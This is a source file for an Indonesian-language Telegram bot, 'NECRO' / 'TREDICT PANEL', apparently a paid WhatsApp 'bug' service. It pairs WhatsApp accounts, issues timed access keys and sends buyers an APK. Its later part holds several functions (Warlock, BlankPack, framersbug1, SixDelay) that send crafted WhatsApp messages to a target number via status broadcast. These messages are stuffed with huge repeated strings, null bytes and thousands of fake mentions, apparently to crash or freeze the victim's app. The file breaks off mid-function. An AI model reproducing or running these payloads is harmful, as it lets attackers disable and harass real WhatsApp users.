const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const moment = require('moment-timezone');
const config = require("./config.js");
const tokens = config.tokens;
const bot = new Telegraf(tokens);
const axios = require("axios");
const OwnerId = config.owner;
const VPS = config.ipvps;
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const PORT = config.port;
const file = "./akses.json";

let userApiBug = null;


const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const userPath = path.join(__dirname, "./database/user.json");
app.use(express.static(path.join(__dirname, "public")));

app.use('/img', express.static(path.join(__dirname, 'img')));

app.use(cookieParser());

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

module.exports = { loadAkses, saveAkses, isOwner, isAuthorized };

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let key = "";
  for (let i = 0; i < length; i++) {
    key += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return key;
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 24 * 60 * 60 * 1000 : value * 60 * 60 * 1000;
}

const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  useSingleFileAuthState,
  initInMemoryKeyStore,
  fetchLatestBaileysVersion,
  makeWASocket: WASocket,
  AuthenticationState,
  BufferJSON,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  generateRandomMessageId,
  prepareWAMessageMedia,
  getContentType,
  mentionedJid,
  relayWAMessage,
  templateMessage,
  InteractiveMessage,
  Header,
  MediaType,
  MessageType,
  MessageOptions,
  MessageTypeProto,
  WAMessageContent,
  WAMessage,
  WAMessageProto,
  WALocationMessage,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMediaUpload,
  WAMessageStatus,
  WA_MESSAGE_STATUS_TYPE,
  WA_MESSAGE_STUB_TYPES,
  Presence,
  emitGroupUpdate,
  emitGroupParticipantsUpdate,
  GroupMetadata,
  WAGroupMetadata,
  GroupSettingChange,
  areJidsSameUser,
  ChatModification,
  getStream,
  isBaileys,
  jidDecode,
  processTime,
  ProxyAgent,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  Browsers,
  Browser,
  WAFlag,
  WAContextInfo,
  WANode,
  WAMetric,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  DisconnectReason,
  MediaConnInfo,
  ReconnectMode,
  AnyMessageContent,
  waChatKey,
  WAProto,
  proto,
  BaileysError,
} = require('@whiskeysockets/baileys');

let Ren;

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    list.push(BotNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    Ren = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      Ren.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, Ren);
          return resolve();
        }
        if (connection === "close") {
          const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      Ren.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  Ren = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  Ren.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, Ren);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await Ren.requestPairingCode(BotNumber);
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;

          const codeData = makeCode(BotNumber, formatted);
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, codeData.text, {
            parse_mode: "Markdown",
            reply_markup: codeData.reply_markup
          });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  Ren.ev.on("creds.update", saveCreds);
  return Ren;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});
console.clear();
console.log(chalk.red(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡟⠛⠉⠙⢻⣿⡟⠋⠉⠙⢻⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣷⣀⣀⣠⣾⠛⣷⣄⣀⣀⣼⡏⠀⠀⠀⠀
⠀⠀⣀⠀⠀⠛⠋⢻⣿⣧⣤⣸⣿⡟⠙⠛⠀⠀⣀⠀⠀
⢀⣰⣿⣦⠀⠀⠀⠼⣿⣿⣿⣿⣿⡷⠀⠀⠀⣰⣿⣆⡀
⢻⣿⣿⣿⣧⣄⠀⠀⠁⠉⠉⠋⠈⠀⠀⣀⣴⣿⣿⣿⡿
⠀⠀⠀⠈⠙⠻⣿⣶⣄⡀⠀⢀⣠⣴⣿⠿⠛⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⣻⣿⣷⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣿⠿⠋⠉⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀
⣴⣶⣶⣾⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣷⣶⣶⣦
⠙⢻⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡿⠋
⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╭─☐ BOT NECRO  
├─ ID OWN : ${OwnerId}
├─ BOT : RUNNING... ✅
╰───────────────────`));
initializeWhatsAppConnections();

// ===== Path file =====
const configsPath = path.join(__dirname, "config.js");
const aksessPath = path.join(__dirname, "akses.json");
const adminsPath = path.join(__dirname, "database", "admin.json");

// ===== Fungsi baca JSON / JS dengan aman =====
function safeReadJSON(filePath, isJS = false) {
  try {
    if (isJS) {
      // jika file JS module.exports
      return require(filePath);
    }
    const raw = fs.readFileSync(filePath, "utf8");
    return JSON.parse(raw);
  } catch (err) {
    console.error(`❌ Gagal membaca file ${filePath}:`, err);
    return null;
  }
}

// ===== Cek owner =====
function isOwner(userId) {
  const configData = safeReadJSON(configsPath, true);
  const aksesData = safeReadJSON(aksessPath, false);

  // Ambil owners dari config.js / akses.json
  let ownersConfig = [];
  if (Array.isArray(configData?.owner)) {
    ownersConfig = configData.owner.map(Number);
  } else if (configData?.owner) {
    ownersConfig = [Number(configData.owner)];
  }

  const ownersAkses = Array.isArray(aksesData?.owners) ? aksesData.owners.map(Number) : [];

  // Cek ID user di salah satu file
  return ownersConfig.includes(Number(userId)) || ownersAkses.includes(Number(userId));
}

// ===== Cek akses =====
function isAkses(userId) {
  const data = safeReadJSON(aksessPath);
  return Array.isArray(data?.akses) && data.akses.includes(Number(userId));
}

// ===== Cek admin =====
function isAdmin(userId) {
  const adminData = safeReadJSON(adminsPath);
  return Array.isArray(adminData) && adminData.includes(Number(userId));
}

// ===== Permission helper =====
function hasPermission(userId) {
  try {
    return isOwner(userId) || isAkses(userId) || isAdmin(userId);
  } catch {
    return false;
  }
}

// ----- ( Comand Sender & Del Sende Handlerr ) ----- \\
bot.command("start", async (ctx) => {
  try {
    // URL gambar atau path lokal
    const imagePath = path.join(__dirname, "img", "tredict.jpg"); // pastikan filenya ada
    const userName = ctx.from.first_name || "Pengguna";

    const welcomeText = `
👋 Hai *${userName}*!
Welcome to *TREDICT PANEL*.

📝 Fitur yang tersedia:
• /connect - Menambahkan sender
• /listsender - Lihat daftar sender aktif
• /delsender - Hapus sender
• /addkey - Buat key baru
• /listkey - Lihat daftar key
• /delkey - Hapus key
• /addakses - Tambah akses user
• /delakses - Hapus akses user
• /addowner - Tambah owner
• /delowner - Hapus owner

✨ Gunakan bot ini dengan bijak dan pastikan kamu punya akses sesuai role!
`;

    // Kirim foto beserta caption
    await ctx.replyWithPhoto(
      { source: imagePath },
      { caption: welcomeText, parse_mode: "Markdown" }
    );

  } catch (err) {
    console.error("❌ Error command /start:", err);
    ctx.reply("⚠️ Terjadi kesalahan saat menampilkan start message.");
  }
});

bot.command("connect", async (ctx) => {
  if (!hasPermission(ctx.from.id)) return ctx.reply("Hanya owner yang bisa menambahkan sender.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("Masukkan nomor WA: `/connect 62xxxx`", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await ctx.reply(`⏳ Memulai pairing ke nomor ${BotNumber}...`);
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Daftar Sender Aktif:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delsender", async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Contoh: /delsender 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);

  }
});

bot.command("/addkey", async (ctx) => {
  try {
    if (!hasPermission(ctx.from.id)) {
      return ctx.reply("❌ Kamu tidak memiliki akses ke fitur ini.");
    }

    const args = ctx.message.text.split(" ")[1];
    if (!args || !args.includes(",")) {
      return ctx.reply(
        "❗ Format salah.\n" +
        "Contoh: 1. `/buatkey xata,30d`\n" +
        "Contoh: 1. `/buatkey xata,30d,<admin/vip/owner>`\n" +
        "_username_,_durasi_[,_role_]",
        { parse_mode: "Markdown" }
      );
    }

    const [usernameRaw, durasiStrRaw, roleRaw] = args.split(",");
    const username = usernameRaw.trim();
    const durasiStr = durasiStrRaw.trim();
    const role = (roleRaw || "user").trim().toLowerCase();

    const durationMs = parseDuration(durasiStr);
    if (!durationMs) {
      return ctx.reply("❌ Format durasi salah!\nGunakan contoh: 1d");
    }

    const key = generateKey(4);
    const expired = Date.now() + durationMs;

    const users = getUsers();
    const userIndex = users.findIndex(u => u.username === username);

    if (userIndex !== -1) {
      users[userIndex] = { ...users[userIndex], key, expired, role };
    } else {
      users.push({ username, key, expired, role });
    }

    saveUsers(users);

    const expiredStr = new Date(expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });

    const apiBaseUrl = `${process.env.PROTOCOL || "http"}://${VPS}:${PORT}`;

    const msg = [
      "✅ *KEY BERHASIL DIBUAT!*",
      "",
      `📌 *Username:* \`${username}\``,
      `🔑 *Key:* \`${key}\``,
      `👤 *Role:* \`${role}\``,
      `⏳ *Expired:* _${expiredStr}_ WIB`
    ].join("\n");

    await ctx.replyWithMarkdown(msg);

    // Kirim pesan tunggu
    const waitMsg = await ctx.replyWithMarkdown(
      `⏳ *Tunggu beberapa saat, File aplikasi sedang disiapkan...*`
    );

    const path = require("path");

    // Kirim file APK
    await ctx.replyWithDocument(
      { source: path.join(__dirname, "public", "NECRO.apk") },
      {
        caption: [
          "*ORIGINAL OFFICIAL APPS*",
          "",
          "✅ File ini aman karena langsung dari *Official Developer*.",
          "",
          "📅 *Versi:* 1.1.0",
          "*TREDICT INVICTUS*"
        ].join("\n"),
        parse_mode: "Markdown"
      }
    );

    // Hapus pesan tunggu setelah file terkirim
    await ctx.deleteMessage(waitMsg.message_id);

  } catch (err) {
    console.error("❌ Error saat membuat key:", err);
    ctx.reply("⚠️ Terjadi kesalahan saat membuat key. Silakan coba lagi.");
  }
});

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');

  if (!fs.existsSync(filePath)) return [];

  try {
    const rawData = fs.readFileSync(filePath, 'utf-8');
    const parsed = JSON.parse(rawData);

    let users = [];

    if (Array.isArray(parsed)) {
      users = parsed;
    } else if (typeof parsed === 'object' && parsed !== null) {
      users = [parsed];
    }

    // Konversi expired ke number (kalau ada)
    return users.map(u => ({
      ...u,
      expired: u.expired ? Number(u.expired) : null
    }));
  } catch (err) {
    console.error("❌ Gagal membaca user.json:", err);
    return [];
  }
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');

  const normalizedUsers = users.map(u => ({
    ...u,
    expired: u.expired ? Number(u.expired) : null
  }));

  try {
    fs.writeFileSync(filePath, JSON.stringify(normalizedUsers, null, 2), 'utf-8');
    console.log("✅ Data user berhasil disimpan.");
  } catch (err) {
    console.error("❌ Gagal menyimpan user:", err);
  }
}

bot.command("listkey", (ctx) => {
  if (!hasPermission(ctx.from.id)) {
    return ctx.reply("❌ Kamu tidak memiliki akses ke fitur ini.");
  }

  const users = getUsers();
  if (users.length === 0) return ctx.reply("📭 Belum ada key yang dibuat.");

  let teks = `📜 *Daftar Key Aktif:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `*${i + 1}. ${u.username}*\nKey: \`${u.key}\`\nExpired: _${exp}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});


bot.command("delkey", (ctx) => {
  if (!hasPermission(ctx.from.id)) {
    return ctx.reply("❌ Kamu tidak memiliki akses ke fitur ini.");
  }

  const username = ctx.message.text.split(" ")[1];
  if (!username) return ctx.reply("❗ Masukkan username!\nContoh: /delkey renx");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) {
    return ctx.reply(`❌ Username \`${username}\` tidak ditemukan.`, { parse_mode: "Markdown" });
  }

  users.splice(index, 1);
  saveUsers(users);

  ctx.reply(`🗑️ Key milik *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addakses", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa tambah akses!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /addakses <user_id>");

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✅ User sudah punya akses.");
  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✅ Akses diberikan ke ID: ${id}`);
});

bot.command("delakses", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa hapus akses!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /delakses <user_id>");

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("❌ User tidak ditemukan.");
  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`🗑️ Akses user ID ${id} dihapus.`);
});

bot.command("addowner", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa tambah owner!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /addowner <user_id>");

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✅ Sudah owner.");
  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`👑 Owner baru ditambahkan: ${id}`);
});

bot.command("delowner", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa hapus owner!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /delowner <user_id>");

  const data = loadAkses();
  if (!data.owners.includes(id)) return ctx.reply("❌ Bukan owner.");
  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`🗑️ Owner ID ${id} berhasil dihapus.`);
});

const mediaData = [
  {
    ID: "68917910",
    uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
    buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
    sid: "5e03e0",
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
    ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
    mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
  },
  {
    ID: "68884987",
    uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
    buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
    sid: "5e03e0",
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
    ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
    mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
  },
];

let sequentialIndex = 0;

async function Warlock(X) {
  const selectedMedia = mediaData[sequentialIndex];
  sequentialIndex = (sequentialIndex + 1) % mediaData.length;

  const MD_ID = selectedMedia.ID;
  const MD_Uri = selectedMedia.uri;
  const MD_Buffer = selectedMedia.buffer;
  const MD_SID = selectedMedia.sid;
  const MD_sha256 = selectedMedia.SHA256;
  const MD_encsha25 = selectedMedia.ENCSHA256;
  const mkey = selectedMedia.mkey;

  let parse = true;
  let type = `image/webp`;
  if (11 > 9) {
    parse = false;
  }

  try {
    let message = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: `https://mmg.whatsapp.net/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}&mms3=true`,
            fileSha256: MD_sha256,
            fileEncSha256: MD_encsha25,
            mediaKey: mkey,
            mimetype: type,
            directPath: `/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}`,
            fileLength: {
              low: Math.floor(Math.random() * 1000),
              high: 0,
              unsigned: true,
            },
            mediaKeyTimestamp: {
              low: Math.floor(Math.random() * 1700000000),
              high: 0,
              unsigned: false,
            },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              participant: X,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1000 * 40 },
                  () =>
                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593,
            },
            stickerSentTs: {
              low: Math.floor(Math.random() * -20000000),
              high: 555,
              unsigned: parse,
            },
            isAvatar: parse,
            isAiSticker: parse,
            isLottie: parse,
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(X, message, {});
    await Ren.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [X],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: X },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    console.log(chalk.red("─────「 ⏤!NECRO iNVASiON!⏤ 」─────"));
  } catch (err) {
    console.error(err);
  }
}

async function BlankPack(X) {
  let Message = {
    key: {
      remoteJid: "status@broadcast",
      fromMe: false,
      id: crypto.randomUUID()
    },
    message: {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "ꦽ".repeat(45000),
        publisher: "El Kontole",
        stickers: [
          { fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp", isAnimated: false, mimetype: "image/webp" }
        ],
        fileLength: "3662919",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
        contextInfo: {
          remoteJid: X,
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
          mentionedJid: [
            "6285215587498@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
          ]
        },
        packDescription: "",
        mediaKeyTimestamp: "1747502082",
        trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
        thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
        thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
        thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED",
        quotedMessage: {
          callLogMesssage: {
            isVideo: true,
            callOutcome: "REJECTED",
            durationSecs: "1",
            callType: "SCHEDULED_CALL",
            participants: [
              { jid: X, callOutcome: "CONNECTED" },
              { jid: "0@s.whatsapp.net", callOutcome: "REJECTED" },
              { jid: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
              { jid: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" }
            ]
          }
        }
      }
    }
  };

  await Ren.relayMessage("status@broadcast", Message.message, {
    messageId: Message.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: X }, content: undefined }]
          }
        ]
      }
    ]
  });
}

async function framersbug1(X) {
  const messageId = crypto.randomUUID();

  const Message = proto.Message.fromObject({
    key: {
      remoteJid: "status@broadcast",
      fromMe: false,
      id: messageId
    },
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "᬴".repeat(20000),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            version: 3,
            paramsJson: "\u0000".repeat(30000)
          },
          contextInfo: {
            participant: X,
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "᬴".repeat(1000),
              newsletterJid: "120363330344810280@newsletter",
              serverMessageId: 1
            },
            mentionedJid: [
              X,
              ...Array.from({ length: 1950 }, () =>
                `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  });

  await Ren.relayMessage("status@broadcast", Message, {
    messageId: messageId,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: X }, content: undefined }
            ]
          }
        ]
      }
    ]
  });
}

async function SixDelay(X) {
  try {
    let msg = await generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32)
          },
          interactiveResponseMessage: {
            body: {
              text: "᬴".repeat(10000),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "cta_call",
              paramsJson: "\u0000".repeat(50000),
              version: 3
            },
            contextInfo: {
              mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              )
              ],
              isForwarded: true,
              forwardingScore: 9999,
              forwardedNewsletterMessageInfo: {
                newsletterName: "sexy.com",
                newsletterJid: "333333333333333333@newsletter",
                serverMessageId: 1
              }
            }
          }
        }
      }
    }, {});

    await Ren.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [X],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
